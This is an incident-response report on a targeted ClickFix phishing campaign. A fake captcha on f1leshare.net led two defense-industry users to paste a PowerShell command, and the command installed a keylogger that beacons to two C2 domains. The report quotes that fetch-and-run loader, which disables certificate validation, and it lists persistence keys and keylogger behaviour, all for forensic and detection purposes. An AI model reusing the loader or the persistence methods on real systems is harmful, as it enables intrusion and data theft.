# Incident Analysis Report

## Executive Summary

On **2026-03-29 between 17:46 and 17:54 UTC**, two users at separate organizations — `anders` (anders-desktop, Kongsberg Gruppen) and `john` (john-desktop, Airbus) — were tricked by a targeted phishing operation hosted at `f1leshare.net` (typosquat of "fileshare") into pasting a malicious PowerShell command into the Windows Run dialog. The command downloaded `updater.exe`, a keylogger / clipboard-stealer that establishes persistence via the `Run` registry key and the user `Startup` folder, then beacons keystrokes and active-window data to two C2 servers (`MiccosoftUpdate.com` and `windowsupdater.tk`). On `anders-desktop` the malware also spawned `cmd.exe` to enumerate user folders and read the contents of an email file (`polen.eml`) on the desktop.

## IOC Table

| # | IOC Type | Value | Context | Evidence |
|---|----------|-------|---------|----------|
| 1 | Domain | `f1leshare.net` | Phishing/staging site (typosquat for "fileshare"); fake "Fortinet" download portal | DNS query `f1leshare.net → 10.3.124.26` from anders-desktop and john-desktop in `logs-network_traffic.dns-*` (17:46:30 → 17:47:15) |
| 2 | IP | `10.3.124.26` | Resolves `f1leshare.net`; serves `/download/updater` payload | HTTP `GET http://f1leshare.net/download/updater` returned 200 to `WindowsPowerShell/5.1` user-agent (`logs-network_traffic.http-*`, 17:47:07.104) |
| 3 | URL | `http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no` | Targeted lure URL for `anders` (Kongsberg theme) | HTTP log on anders-desktop at 17:46:32, opened by `msedge.exe` |
| 4 | URL | `http://f1leshare.net/?file=norway-buys-80-jets&share=reddit.com` | Targeted lure URL for `john` (Airbus / fighter-jet theme) | HTTP log on john-desktop at 17:47:03, opened by `msedge.exe` |
| 5 | URL | `http://f1leshare.net/captcha?email=anders%40kongsberg.com&...` and `...email=john%40airbus.com&...` | Fake "captcha" social-engineering page that delivered the run-this-PowerShell instruction; victim emails reflected back | HTTP logs at 17:46:41 (anders) and 17:47:15 (john); user-agent = MS Edge 145/146 |
| 6 | Domain | `MiccosoftUpdate.com` | C2 server #1 (typosquat — "Miccosoft") | HTTP `POST http://MiccosoftUpdate.com/api/info` and `…/api/data` from `updater.exe`; string hardcoded in binary at `0x14001300c` |
| 7 | IP | `10.3.97.182` | C2 #1 endpoint for `MiccosoftUpdate.com` | endpoint.events.network shows `updater.exe → 10.3.97.182:80` at 17:47:22; 10+ HTTP POSTs |
| 8 | Domain | `windowsupdater.tk` | C2 server #2 (free `.tk` TLD; flagged "Suspicious TLD" rule) | DNS `windowsupdater.tk → 10.3.215.83` at 17:47:49; HTTP `POST /windows/checkforupdate` and `/update/servicedata`; string at `0x140013059` |
| 9 | IP | `10.3.215.83` | C2 #2 endpoint | endpoint.events.network: `updater.exe → 10.3.215.83:80` at 17:47:52 |
| 10 | URI | `/api/info`, `/api/data`, `/windows/checkforupdate`, `/update/servicedata` | C2 endpoints | Strings in binary `0x14001327d`, `0x14001306b`, `0x140013141`, `0x140013075`; matched in HTTP logs |
| 11 | File | `C:\Users\<user>\AppData\Local\Temp\updater.exe` | First-stage drop (PowerShell IWR target) | endpoint.events.file `creation` event by `powershell.exe` at 17:47:11 (anders) and 17:49:09 (john) |
| 12 | File | `C:\Users\<user>\AppData\Local\Microsoft\updater.exe` | Persistent copy created by malware itself | endpoint.events.file: `updater.exe` creates this path at 17:47:20; matches Ghidra string `%s\Microsoft\updater.exe` (0x140013197) |
| 13 | File | `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe` | Persistence — user Startup folder | endpoint.events.file creation by `updater.exe` at 17:47:21 |
| 14 | SHA-256 | `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d` | Hash of `updater.exe` (the malware) | `process.hash.sha256` for `C:\Users\anders\AppData\Local\Temp\updater.exe` and same hash for john's copy in endpoint.events.process |
| 15 | Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` = `C:\Users\anders\AppData\Local\Microsoft\updater.exe` | Run-key persistence | endpoint.events.registry modification by `updater.exe` at 17:47:21; key name `MicrosoftUpdater` matches Ghidra string `0x1400131de` |
| 16 | Registry | `HKCU\…\Explorer\RunMRU\a` = `powershell -exec bypass -windowstyle hidden -command "[…IWR f1leshare.net/download/updater…]"` | Proves victim pasted command into Win+R Run dialog | endpoint.events.registry `RunMRU` modification by `explorer.exe` at 17:46:55 (anders) and 17:47:45 (john) |
| 17 | Mutex | `Global\MicrosoftUpdateMutex` | Single-instance check | Ghidra string `0x14001324f`; binary imports `CreateMutexA` |
| 18 | Compromised account | `anders` (anders-desktop) and `john` (john-desktop) | Phished users | All artifacts above; Elastic alerts at 17:54 (Suspicious Powershell, Remote File Download via PowerShell) |
| 19 | Sensitive file accessed | `C:\Users\anders\Desktop\polen.eml` | Read by malware via `cmd.exe /c type` | endpoint.events.process at 17:51:53, parent = `updater.exe` |
| 20 | Discovery commands | `cmd.exe /c dir "C:\Users\..."` (Users, Desktop, Documents) | Filesystem reconnaissance | endpoint.events.process at 17:48:22, 17:49:22, 17:50:53 — parent always `updater.exe` (anders only) |
| 21 | PowerShell command-line | `powershell -exec bypass -windowstyle hidden -command "[ServicePointManager…cert validation $true]; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"` | Initial execution payload | Process command_line on both hosts; SHA-256 of powershell.exe `529ee9d3…6036d2` |
| 22 | User-Agent | `Mozilla/5.0` (literal, no version) | Hardcoded UA in malware C2 traffic | HTTP logs of all `updater.exe` traffic; Ghidra string `0x140013000` |

## Attack Timeline (UTC, 2026-03-29)

| Time | Host | Event | Evidence |
|------|------|-------|----------|
| 17:46:30 | anders-desktop | DNS lookup `f1leshare.net` from Edge browser | dns log |
| 17:46:32 | anders-desktop | `msedge.exe` GET `http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no` (200) | http log |
| 17:46:41 | anders-desktop | GET fake captcha page `…/captcha?email=anders%40kongsberg.com&q=Fortinet/.../Important+Download` | http log |
| 17:46:55.976 | anders-desktop | `RunMRU\a` registry value populated with the full malicious PowerShell command (proof of Win+R paste) | registry log |
| 17:46:55.977 | anders-desktop | `powershell.exe` launched with `-exec bypass -windowstyle hidden …IWR f1leshare.net/download/updater…` | process log |
| 17:47:07 | anders-desktop | PowerShell downloads `updater.exe` from `f1leshare.net` (HTTP 200, UA WindowsPowerShell/5.1) | http log |
| 17:47:11 | anders-desktop | `updater.exe` written to `\AppData\Local\Temp\` | file log |
| 17:47:20 | anders-desktop | `updater.exe` executes; SHA256 `254601…3d7d` | process log |
| 17:47:20 | anders-desktop | Malware copies itself to `…\AppData\Local\Microsoft\updater.exe` | file log |
| 17:47:21 | anders-desktop | Persistence: Run key `HKCU\…\Run\MicrosoftUpdater` set; `msteamsupdater.exe` dropped in Startup folder | registry + file logs |
| 17:47:19–17:47:29 | anders-desktop | First C2 callbacks: `POST MiccosoftUpdate.com/api/info` then repeated `/api/data` to 10.3.97.182 | http log |
| 17:47:49 | anders-desktop | DNS `windowsupdater.tk → 10.3.215.83` resolved | dns log |
| 17:47:52 | anders-desktop | Second C2 channel: `POST windowsupdater.tk/windows/checkforupdate` (10.3.215.83) | http log |
| 17:47:03 → 17:47:45 | john-desktop | Same kill-chain replayed for `john`: lure URL `?file=norway-buys-80-jets&share=reddit.com` → captcha page with `john@airbus.com` → Win+R paste → PowerShell IWR | http + registry + process logs |
| 17:48:22 | anders-desktop | Malware runs `cmd.exe /c dir "C:\Users"` (parent = `updater.exe`) — discovery | process log |
| 17:49:22 | anders-desktop | `cmd.exe /c dir "C:\Users\anders\Documents"` | process log |
| 17:49:12 | john-desktop | `updater.exe` running on john-desktop | process log |
| 17:50:53 | anders-desktop | `cmd.exe /c dir "C:\Users\anders\Desktop"` | process log |
| 17:51:53 | anders-desktop | `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` — malware reads an email file | process log |
| 17:47–17:54+ | both | Continuous keystroke/window-title beacons to both C2s | http logs (many `/api/data` POSTs) |
| 17:54:20 | both | Elastic detection rules fire ("Remote File Download via PowerShell", "Suspicious Windows Powershell Arguments", "Network Activity to a Suspicious Top Level Domain") | `.internal.alerts-security.alerts-default-000001` |

## Binary Analysis (Ghidra) — `updater.exe` (SHA-256 `254601…3d7d`)

Key imports (`mcp_ghidra_list_imports`):
- **Keylogging / spying**: `GetAsyncKeyState`, `GetForegroundWindow`, `GetWindowTextA`, `OpenClipboard`, `GetClipboardData`, `CloseClipboard`
- **C2 networking**: `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, `InternetCloseHandle`
- **Crypto (likely AES of exfil data)**: `BCryptOpenAlgorithmProvider`, `BCryptGenerateSymmetricKey`, `BCryptEncrypt`, `BCryptDecrypt`
- **Persistence**: `RegCreateKeyExA`, `RegSetValueExA`, `CopyFileA`, `SHGetFolderPathA`
- **Execution / recon**: `CreateProcessA`, `CreatePipe`, `GetComputerNameA`, `GetUserNameA`, `GetSystemInfo`, `CreateMutexA`, `FreeConsole`

Hardcoded strings (`mcp_ghidra_list_strings`):
- `MiccosoftUpdate.com` (`0x14001300c`), `windowsupdater.tk` (`0x140013059`)
- `/api/info`, `/api/data`, `/windows/checkforupdate`, `/update/servicedata`
- `Mozilla/5.0` (no version) — distinctive, used in all C2 HTTP traffic
- `cmd.exe /c %s` — confirms the malware shells out (matches the `cmd.exe /c dir` and `cmd.exe /c type polen.eml` events)
- `%s\Microsoft\updater.exe`, `Software\Microsoft\Windows\CurrentVersion\Run`, `MicrosoftUpdater` — persistence templates
- `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater` — secondary persistence (Scheduled Task) preparation, although no task creation event was observed in this dataset
- `Global\MicrosoftUpdateMutex` — single-instance mutex

Decompilation of the main worker (`FUN_140003233`) confirms an infinite loop that:
1. `FreeConsole()` (hide window)
2. Calls `GetForegroundWindow` → `GetWindowTextA`, formats `[WINDOW: %s]` and POSTs it on window change
3. Polls `GetAsyncKeyState(0x08…0x100)`, encodes A–Z (Shift-aware), 0–9, space/enter/tab/backspace, punctuation into a 900-byte buffer
4. Flushes the buffer to C2 via `HttpSendRequestA` to `/api/data` (host pulled from a `Host:` header in a config blob)
5. `Sleep(100)` and loops

A separate C2 thread (created with `CreateThread` to `LAB_140002a28`) handles the second channel (`windowsupdater.tk/windows/checkforupdate`), which appears to be the command-receive channel — this matches the observed pattern where `cmd.exe /c dir …` and `cmd.exe /c type polen.eml` are spawned by `updater.exe` minutes after the beacon starts.

## Interesting Findings

1. **Spear-phishing themes were tailored per victim and per organization.** The lure URL for anders contained `kongsberggrupper-insider` and was visited from a Kongsberg account (`anders@kongsberg.com`); john's URL contained `norway-buys-80-jets` (`john@airbus.com`). Both match Norwegian defense-industry topics — Kongsberg Gruppen and Airbus are both involved in Norway's F-35 / NSM programs. This is **not opportunistic** malware — it was a targeted operation.
2. **The "fake captcha → Win+R → PowerShell" technique (a.k.a. ClickFix / paste-and-run).** The `RunMRU\a` registry artifact captures the *exact* command pasted into Win+R, which is forensic gold and proves user-driven execution rather than browser exploit. The fake captcha page even displayed the Fortinet logo (`/static/fortinet_logo.png`) to look legitimate. Both victims fell for it within 1 minute of visiting.
3. **Two parallel C2 channels with different roles.** `MiccosoftUpdate.com` receives the keystroke / clipboard / window-title exfil (`/api/data`); `windowsupdater.tk` is the command/tasking channel (`/windows/checkforupdate`, `/update/servicedata`). Both domains are deliberate Microsoft typosquats ("Miccosoft", and the legitimate-sounding "windowsupdater" on the abusable `.tk` TLD).
4. **Brand mimicry across the kill chain.** Phishing site mimics Fortinet, malware mimics "Microsoft Updater"; the persistence file `msteamsupdater.exe` mimics Microsoft Teams; Run-key value `MicrosoftUpdater`. Designed to survive a casual look at Task Manager / msconfig.
5. **Operator activity beyond the implant.** On anders-desktop, after the beacon was healthy, the operator issued recon (`dir Users / Documents / Desktop`) and then **specifically opened `polen.eml`** on the desktop using `cmd.exe /c type`. This was a deliberate, targeted action — they were looking for the contents of a specific email (the file name "polen" — Polish/Poland — fits the geopolitical defense theme).
6. **Defensive-evasion in the loader.** PowerShell command uses `-windowstyle hidden`, `-exec bypass`, and disables TLS certificate validation (`ServerCertificateValidationCallback = {$true}`) — it is configured to download from any HTTPS endpoint without validation, even though the actual fetch is plain HTTP.
7. **`emil-desktop` was not compromised.** The user `emil` exists and is active in the dataset, but no `f1leshare.net` traffic, no PowerShell IWR, no `updater.exe`, and no Run-key changes are observed for that host. Only `anders` and `john` were victims.
8. **Hardcoded `Mozilla/5.0` UA (literal, no version)** in the malware vs. the real Edge UA used by the browser visit makes the malware C2 trivially separable from legitimate web traffic — a useful detection for hunting other infections.

## What Likely Happened (MITRE ATT&CK mapping)

1. **Initial Access (T1566.002 – Spearphishing Link)** – Both victims received targeted phishing messages directing them to `f1leshare.net`. The lure page (Fortinet-branded) showed a fake captcha that instructed the user to press **Win+R, paste a "verification command", and press Enter** — the **ClickFix** technique (T1204.004 – User Execution: Malicious Copy and Paste).
2. **Execution (T1059.001 – PowerShell)** – The pasted command was `powershell -exec bypass -windowstyle hidden -command "…IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe…; & $env:TEMP\updater.exe"`, recorded verbatim in `RunMRU\a` and in process logs.
3. **Defense Evasion (T1218 / T1562)** – `-windowstyle hidden`, TLS validation bypass, hardcoded generic `Mozilla/5.0` UA, `FreeConsole()` in the binary.
4. **Persistence (T1547.001 – Registry Run Key + T1547.001 – Startup Folder)** – `updater.exe` self-copied to `…\AppData\Local\Microsoft\updater.exe`, registered itself under `HKCU\…\Run\MicrosoftUpdater`, and additionally dropped `msteamsupdater.exe` in the user `Startup` folder. The binary also contains a Schedule\TaskCache string suggesting capability for T1053.005.
5. **Discovery (T1083 – File and Directory Discovery, T1033 – System Owner)** – `cmd.exe /c dir` against Users, Documents, Desktop, plus `GetUserNameA`/`GetComputerNameA`/`GetSystemInfo` calls.
6. **Collection (T1056.001 – Keylogging, T1115 – Clipboard, T1005 – Local System Data)** – `GetAsyncKeyState`-based keylogger, `OpenClipboard`/`GetClipboardData`, and `cmd.exe /c type polen.eml` to read a specific email file.
7. **Command and Control (T1071.001 – Web Protocols, T1090 – Multi-stage)** – Two HTTP/80 channels: data exfil to `MiccosoftUpdate.com/api/data`, tasking from `windowsupdater.tk/windows/checkforupdate`. Payloads are encrypted (BCrypt symmetric / likely AES) before transmission.
8. **Exfiltration (T1041 – Exfiltration Over C2 Channel)** – Keystrokes, window titles, clipboard, and at least the contents of `polen.eml` were sent over the existing C2 HTTP POSTs (continuous `/api/data` traffic visible from 17:47 onward).

**Bottom line:** A targeted ClickFix phishing campaign aimed at Norwegian defense-industry employees (Kongsberg Gruppen and Airbus) successfully compromised two endpoints with a custom keylogger/RAT (`updater.exe`, SHA-256 `254601…3d7d`) that beacons to two typosquat C2 domains. Both hosts (`anders-desktop`, `john-desktop`) and both user accounts (`anders`, `john`) must be considered compromised; persistence (Run key `MicrosoftUpdater` + Startup file `msteamsupdater.exe` + the `\AppData\Local\Microsoft\updater.exe` binary) must be removed; the `polen.eml` email and any keystrokes typed since 17:47 UTC on 2026-03-29 should be assumed exfiltrated.
